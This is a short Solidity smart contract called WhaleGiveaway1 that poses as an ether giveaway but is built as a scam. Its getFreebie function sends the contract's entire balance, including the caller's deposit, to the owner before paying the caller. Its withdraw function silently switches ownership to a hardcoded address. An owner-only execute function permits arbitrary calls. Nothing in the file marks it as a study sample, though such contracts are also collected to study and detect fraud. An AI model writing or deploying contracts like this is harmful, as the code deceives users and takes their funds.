pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        owner.transfer(this.balance);
    }

    function execute(address recipient, bytes data) public payable {
        require(msg.sender == owner);
        require(recipient != address(0));
        require(data.length > 0);

        bool success;
        assembly {
            success := call(gas, recipient, msg.value, add(data, 0x20), mload(data), 0, 0)
        }
        require(success);
    }
}